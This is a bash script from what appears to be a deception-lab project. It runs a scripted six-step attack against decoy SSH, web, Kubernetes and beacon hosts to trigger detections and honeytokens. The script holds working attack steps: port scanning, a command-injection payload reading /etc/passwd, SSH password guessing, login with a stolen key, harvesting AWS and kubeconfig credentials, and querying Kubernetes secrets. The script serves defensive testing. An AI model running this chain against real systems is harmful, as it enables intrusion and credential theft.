#!/usr/bin/env bash
# scripts/attack.sh — Deterministic attack runner against Deception SOC lab decoys (docs/13).
# LAB USE ONLY: Targets ONLY lab decoy hosts on the isolated decoy_net network.
#
# Usage:
#   scripts/attack.sh [--fast | --slow]
#
# Flags:
#   --fast   Fast pacing (0.5s pause) for automated tests / CI
#   --slow   Slow pacing (4.0s pause) for human-like demonstration
#   (default 2.5s pause between major steps)
set -euo pipefail

DELAY=2.5

for arg in "$@"; do
  case "$arg" in
    --fast)
      DELAY=0.5
      ;;
    --slow)
      DELAY=4.0
      ;;
    *)
      echo "Unknown flag: $arg (supported: --fast, --slow)"
      exit 1
      ;;
  esac
done

pause() {
  sleep "$DELAY"
}

# Decoy target endpoints (defaults match docker-compose service names on decoy_net)
SSH_HOST="${SSH_HOST:-decoy-ssh}"
SSH_PORT="${SSH_PORT:-2222}"
WEB_HOST="${WEB_HOST:-decoy-web}"
WEB_PORT="${WEB_PORT:-8080}"
K8S_HOST="${K8S_HOST:-decoy-k8s}"
K8S_PORT="${K8S_PORT:-6443}"
BEACON_HOST="${BEACON_HOST:-decoy-beacon}"
BEACON_PORT="${BEACON_PORT:-8088}"

WORK_DIR="${WORK_DIR:-/tmp/attack_run}"
mkdir -p "$WORK_DIR/backup"
COOKIE_JAR="$WORK_DIR/cookies.txt"
rm -f "$COOKIE_JAR"

echo "======================================================================"
echo " Deception SOC — Automated Attack Demonstration"
echo " Pacing delay: ${DELAY}s between steps"
echo " Targets: SSH ($SSH_HOST:$SSH_PORT), Web ($WEB_HOST:$WEB_PORT),"
echo "          K8s ($K8S_HOST:$K8S_PORT), Beacon ($BEACON_HOST:$BEACON_PORT)"
echo "======================================================================"

# Locate seed files (docker volume /seed, or local seed/out)
find_seed_file() {
  local filename="$1"
  for dir in "/seed" "/seed/out" "backend/go/seed/out" "seed/out" "../backend/go/seed/out"; do
    if [ -f "${dir}/${filename}" ]; then
      echo "${dir}/${filename}"
      return 0
    fi
  done
  return 1
}

PERSONA_FILE="$(find_seed_file "persona.json" || true)"
TOKENS_FILE="$(find_seed_file "tokens.json" || true)"

AWS_KEY=""
KUBE_TOKEN=""

if [ -n "$TOKENS_FILE" ] && [ -f "$TOKENS_FILE" ]; then
  echo "[*] Found seed tokens file: $TOKENS_FILE"
  AWS_KEY="$(jq -r '.tok_aws_k7.match_value // empty' "$TOKENS_FILE" 2>/dev/null || true)"
  KUBE_TOKEN="$(jq -r '.tok_kube.match_value // empty' "$TOKENS_FILE" 2>/dev/null || true)"
fi

if [ -n "$PERSONA_FILE" ] && [ -f "$PERSONA_FILE" ]; then
  echo "[*] Found seed persona file: $PERSONA_FILE"
fi

# -----------------------------------------------------------------------------
# Step 1: Decoy Subnet Reconnaissance (Port Sweep)
# -----------------------------------------------------------------------------
echo
echo "======================================================================"
echo " [Step 1/6] Decoy Reconnaissance — Port Sweep"
echo " Scanning decoy ports ($SSH_PORT, $WEB_PORT, $BEACON_PORT, $K8S_PORT)"
echo " Expected: T1046 (Network Service Scanning), actor created at low risk"
echo "======================================================================"

nmap -sT -Pn -p "$SSH_PORT" "$SSH_HOST" >/dev/null 2>&1 || true
nmap -sT -Pn -p "$WEB_PORT" "$WEB_HOST" >/dev/null 2>&1 || true
nmap -sT -Pn -p "$BEACON_PORT" "$BEACON_HOST" >/dev/null 2>&1 || true
nmap -sT -Pn -p "$K8S_PORT" "$K8S_HOST" >/dev/null 2>&1 || true

echo "[+] Port sweep complete against decoy cluster."
pause

# -----------------------------------------------------------------------------
# Step 2: Web Reconnaissance, Honeyfile Download & Command Injection
# -----------------------------------------------------------------------------
echo
echo "======================================================================"
echo " [Step 2/6] Web Reconnaissance & Honeyfile Extraction"
echo " Probing /robots.txt, /admin/backup, downloading internal-backup.zip"
echo " Testing command injection bait /api/diagnostics?host=..."
echo " Expected: T1190 (Exploit Public-Facing Application), honeyfile seen"
echo "======================================================================"

echo "[*] GET /robots.txt"
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "http://${WEB_HOST}:${WEB_PORT}/robots.txt" >/dev/null 2>&1 || true

echo "[*] GET /admin/backup"
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "http://${WEB_HOST}:${WEB_PORT}/admin/backup" >/dev/null 2>&1 || true

echo "[*] Downloading honeyfile: /admin/backup/internal-backup.zip"
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "http://${WEB_HOST}:${WEB_PORT}/admin/backup/internal-backup.zip" -o "$WORK_DIR/internal-backup.zip" || true

SSH_KEY_FILE="$WORK_DIR/backup/deploy_id_ed25519"
if [ -f "$WORK_DIR/internal-backup.zip" ] && [ -s "$WORK_DIR/internal-backup.zip" ]; then
  unzip -q -o "$WORK_DIR/internal-backup.zip" -d "$WORK_DIR/backup" 2>/dev/null || true
fi

if [ -f "$SSH_KEY_FILE" ]; then
  chmod 600 "$SSH_KEY_FILE"
  echo "[+] Successfully extracted SSH private key: $SSH_KEY_FILE"
else
  # Fallback: check seed volume for deploy key if download was empty
  ALT_KEY="$(find_seed_file "deploy_id_ed25519" || true)"
  if [ -n "$ALT_KEY" ] && [ -f "$ALT_KEY" ]; then
    cp "$ALT_KEY" "$SSH_KEY_FILE"
    chmod 600 "$SSH_KEY_FILE"
    echo "[+] Used seed deploy key: $SSH_KEY_FILE"
  fi
fi

echo "[*] Triggering command injection bait on diagnostics endpoint"
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "http://${WEB_HOST}:${WEB_PORT}/api/diagnostics?host=8.8.8.8;cat%20/etc/passwd" >/dev/null 2>&1 || true

echo "[+] Web reconnaissance complete."
pause

# -----------------------------------------------------------------------------
# Step 3: SSH Password Guessing & Deploy Key Login
# -----------------------------------------------------------------------------
echo
echo "======================================================================"
echo " [Step 3/6] SSH Password Guessing & Deploy Key Login"
echo " Simulating 6 failed password brute-force attempts for 'deploy'"
echo " Logging in using stolen ed25519 deploy key (credential lineage)"
echo " Expected: T1110.001 (Password Guessing), credential_lineage correlation"
echo "======================================================================"

echo "[*] Performing password guessing (6 failed attempts)..."
for i in 1 2 3 4 5 6; do
  sshpass -p "WrongPassword${i}!" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    -o NumberOfPasswordPrompts=1 \
    -p "$SSH_PORT" "deploy@${SSH_HOST}" exit 2>/dev/null || true
done
echo "[+] Password guessing attempts logged."

echo "[*] Authenticating with stolen deploy key ($SSH_KEY_FILE)..."
if [ -f "$SSH_KEY_FILE" ]; then
  ssh -i "$SSH_KEY_FILE" \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    -p "$SSH_PORT" "deploy@${SSH_HOST}" whoami 2>/dev/null || true
  echo "[+] SSH key authentication succeeded."
else
  echo "[!] Warning: No deploy key available for SSH key auth."
fi
pause

# -----------------------------------------------------------------------------
# Step 4: Host Discovery on SSH & Honeytoken Credential Harvest
# -----------------------------------------------------------------------------
echo
echo "======================================================================"
echo " [Step 4/6] Host Discovery & Lure Harvesting via SSH"
echo " Executing discovery commands: id, uname -a, find, credentials read"
echo " Expected: T1082 (System Discovery), T1083 (File Search), maze unlock"
echo "======================================================================"

run_ssh() {
  local cmd="$1"
  if [ -f "$SSH_KEY_FILE" ]; then
    ssh -i "$SSH_KEY_FILE" \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=5 \
      -p "$SSH_PORT" "deploy@${SSH_HOST}" "$cmd" 2>/dev/null || true
  fi
}

echo "[*] Executing: id"
run_ssh "id" || true

echo "[*] Executing: uname -a"
run_ssh "uname -a" || true

echo "[*] Searching for Kubernetes credentials: find / -name \"*.kube*\""
run_ssh 'find / -name "*.kube*"' || true

echo "[*] Reading AWS credentials honeyfile: cat ~/.aws/credentials"
AWS_CRED_OUT="$(run_ssh "cat ~/.aws/credentials" || true)"

if [ -z "$AWS_KEY" ]; then
  AWS_KEY="$(echo "$AWS_CRED_OUT" | grep -i "aws_access_key_id" | awk -F'=' '{print $2}' | tr -d ' ' || true)"
fi

echo "[+] Host discovery completed. Maze theme 'k8s' stimulated."
pause

# -----------------------------------------------------------------------------
# Step 5: Kubernetes Cluster Enumeration
# -----------------------------------------------------------------------------
echo
echo "======================================================================"
echo " [Step 5/6] Kubernetes Cluster Enumeration"
echo " Reading /opt/deploy/kubeconfig lure and querying K8s API"
echo " Expected: T1613 (Container Discovery), T1552.007 (Container API)"
echo "======================================================================"

echo "[*] Reading /opt/deploy/kubeconfig via SSH..."
KUBECONFIG_OUT="$(run_ssh "cat /opt/deploy/kubeconfig" || true)"

if [ -z "$KUBE_TOKEN" ]; then
  KUBE_TOKEN="$(echo "$KUBECONFIG_OUT" | grep "token:" | awk '{print $2}' | tr -d ' ' || true)"
fi

if [ -n "$KUBE_TOKEN" ]; then
  echo "[*] Querying K8s API: GET /api/v1/namespaces/default/pods"
  curl -k -s -H "Authorization: Bearer ${KUBE_TOKEN}" "https://${K8S_HOST}:${K8S_PORT}/api/v1/namespaces/default/pods" >/dev/null 2>&1 || true

  echo "[*] Querying K8s API: GET /api/v1/namespaces/default/secrets"
  curl -k -s -H "Authorization: Bearer ${KUBE_TOKEN}" "https://${K8S_HOST}:${K8S_PORT}/api/v1/namespaces/default/secrets" >/dev/null 2>&1 || true
  echo "[+] Kubernetes API enumeration completed."
else
  echo "[!] Warning: Kube token could not be resolved."
fi
pause

# -----------------------------------------------------------------------------
# Step 6: AWS Beacon Abuse & URL Tracking Token Trigger
# -----------------------------------------------------------------------------
echo
echo "======================================================================"
echo " [Step 6/6] AWS Honeytoken Beacon Trigger"
echo " Executing SigV4 request using stolen AWS honeytoken (tok_aws_k7)"
echo " Fetching URL tracking token /t/tok_url"
echo " Expected: token.used (sensitivity 5) -> Risk >= 90 (CRITICAL)"
echo "           Alert dispatched to Discord / Slack with @here"
echo "======================================================================"

if [ -n "$AWS_KEY" ]; then
  echo "[*] Sending SigV4 request with honeytoken key: $AWS_KEY"
  curl -s \
    -H "Authorization: AWS4-HMAC-SHA256 Credential=${AWS_KEY}/20261031/ap-south-1/s3/aws4_request, SignedHeaders=host;x-amz-date, Signature=demo-signature" \
    -H "x-amz-date: 20261031T120000Z" \
    "http://${BEACON_HOST}:${BEACON_PORT}/backup/data" >/dev/null 2>&1 || true
else
  echo "[!] Warning: AWS_KEY empty, querying beacon with fallback"
  curl -s "http://${BEACON_HOST}:${BEACON_PORT}/backup/data" >/dev/null 2>&1 || true
fi

echo "[*] Fetching URL tracking token: /t/tok_url"
curl -s "http://${BEACON_HOST}:${BEACON_PORT}/t/tok_url" >/dev/null 2>&1 || true

echo
echo "======================================================================"
echo " [✔] Attack run completed successfully."
echo " Actor profile: 4 linked sessions (Web, SSH, K8s, Beacon)"
echo " Risk escalated to CRITICAL (>= 75) with open incident."
echo "======================================================================"

